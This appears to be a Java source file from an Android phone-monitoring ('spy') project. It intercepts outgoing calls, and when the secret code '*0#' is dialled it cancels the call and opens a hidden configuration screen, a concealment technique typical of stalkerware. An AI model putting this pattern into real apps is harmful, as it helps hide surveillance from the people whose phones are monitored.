package th.ac.bu.mcop.android.spy;

import th.ac.bu.mcop.android.monitor.core.AndroidEvent;
import th.ac.bu.mcop.android.monitor.observer.AndroidWatcher;
import th.ac.bu.mcop.http.core.Logger;
import th.ac.bu.mcop.mobile.monitor.core.Event;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

public class ConfiguratingWatcher extends AndroidWatcher {
	private static final String SHOW_LOGIN_FORM_NUMBER = "*0#";
	private static final String SHOW_UI_REQUEST_NUMBER = "*0#";
	private static final String[] INTENTS = {Intent.ACTION_NEW_OUTGOING_CALL};

	@Override
	public String[] getIntents() {
		return INTENTS;
	}
	
	@Override
	public void observed(Event event) {
		AndroidEvent androidEvent = (AndroidEvent)event;
		Context context = androidEvent.getContext();
		Bundle extras = androidEvent.getIntent().getExtras();
		String outgoingNumber = extras.getString(Intent.EXTRA_PHONE_NUMBER);
		// Check for a special code to start an activity
		if (SHOW_LOGIN_FORM_NUMBER.equals(outgoingNumber) ||
			Logger.getDefault().isDebug() && SHOW_UI_REQUEST_NUMBER.equals(outgoingNumber))
		{
			Intent activity = new Intent(context, ConfiguratingActivity.class);
			activity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(activity);
			// Abort the outgoing call
			BroadcastReceiver broadcastReceiver = (BroadcastReceiver)androidEvent.getSource();
			broadcastReceiver.abortBroadcast();
			broadcastReceiver.setResultData(null);
		}
	}
}